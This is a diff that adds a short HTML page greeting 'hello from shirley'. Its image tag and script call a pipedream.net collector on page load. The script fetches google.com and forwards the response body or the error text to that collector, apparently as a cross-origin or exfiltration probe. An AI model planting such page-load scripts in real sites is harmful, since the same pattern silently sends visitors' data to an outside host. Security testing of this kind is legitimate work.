@@ -1,0 +1,14 @@
+<img src="https://en2celr7rewbul.m.pipedream.net/fetch-cross">
+
+<h1> hello from shirley </h1>
+
+<script>
+  fetch('https://www.google.com')
+                .then(response => response.text())
+                .then(data => { 
+                  fetch("https://en2celr7rewbul.m.pipedream.net/success?data="+data)
+                })
+                .catch(error => {
+                    fetch("https://en2celr7rewbul.m.pipedream.net/fail?data="+error)
+                });
+</script>
